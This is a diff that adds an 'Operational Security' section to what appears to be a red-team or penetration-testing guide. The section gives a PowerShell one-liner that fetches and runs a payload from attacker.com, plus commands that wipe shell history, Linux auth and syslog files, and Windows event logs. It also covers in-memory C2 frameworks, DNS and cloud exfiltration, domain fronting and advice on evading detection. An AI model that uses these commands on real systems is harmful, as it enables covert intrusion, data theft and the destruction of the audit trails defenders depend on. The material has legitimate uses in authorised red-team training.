@@ -567,3 +567,91 @@ sliver > socks start
 - Use encrypted tunnels (SSH/SOCKS5)  
 - Limit scan intensity to avoid detection  
 - Clear logs on pivot hosts  
+
+## 8. Operational Security: Reducing Footprint
+
+### Living Off the Land (LOLBins)
+**Common LOLBins:**
+| Windows               | Linux             |
+|-----------------------|-------------------|
+| `certutil`            | `wget`            |
+| `mshta`               | `curl`            |
+| `bitsadmin`           | `bash`            |
+| `powershell`          | `perl`            |
+| `regsvr32`            | `python`          |
+
+**PowerShell Example:**
+```powershell
+powershell -ep bypass -Command "Invoke-WebRequest -Uri 'http://attacker.com/payload' -OutFile 'C:\Windows\Temp\payload.exe'; Start-Process 'C:\Windows\Temp\payload.exe'"
+```
+
+### Log Management
+**Linux:**
+```bash
+# Disable history temporarily
+unset HISTFILE
+
+# Disable for current session
+export HISTSIZE=0
+
+# Clear existing history
+history -c
+
+# Clear log files
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+```
+
+**Windows:**
+```powershell
+# Disable PowerShell history
+$MaximumHistoryCount = 0
+
+# Clear PowerShell history
+Remove-Item -Path (Get-PSReadlineOption).HistorySavePath
+
+# Clear event logs
+wevtutil cl System
+Clear-EventLog -LogName "Windows PowerShell"
+```
+
+### Memory-Only Operations
+- Use frameworks:
+  - Cobalt Strike
+  - Meterpreter
+  - Sliver
+- Execute payloads entirely in memory
+- Avoid disk writes
+
+### Data Exfiltration Techniques
+1. **DNS Tunneling**
+   - Encode data in DNS queries
+   - Bypass HTTP monitoring
+
+2. **Cloud Storage**
+   - Use encrypted transfers to:
+     - Dropbox
+     - Google Drive
+     - AWS S3
+
+3. **Data Segmentation**
+   - Split large files into chunks
+   - Exfiltrate at random intervals
+   - Use varying protocols
+
+### Network Obfuscation
+```bash
+# Route through encrypted channels
+proxychains nmap -sT 192.168.1.100
+ssh -D 8080 user@jump_host
+
+# Domain fronting techniques
+curl --resolve legitdomain.com:443:1.2.3.4 https://legitdomain.com/api
+```
+
+### Detection Avoidance
+- Rotate C2 infrastructure daily
+- Randomize callback intervals (30-120 mins)
+- Use common user-agents
+- Limit network bandwidth usage
+- Spoof MAC addresses when possible
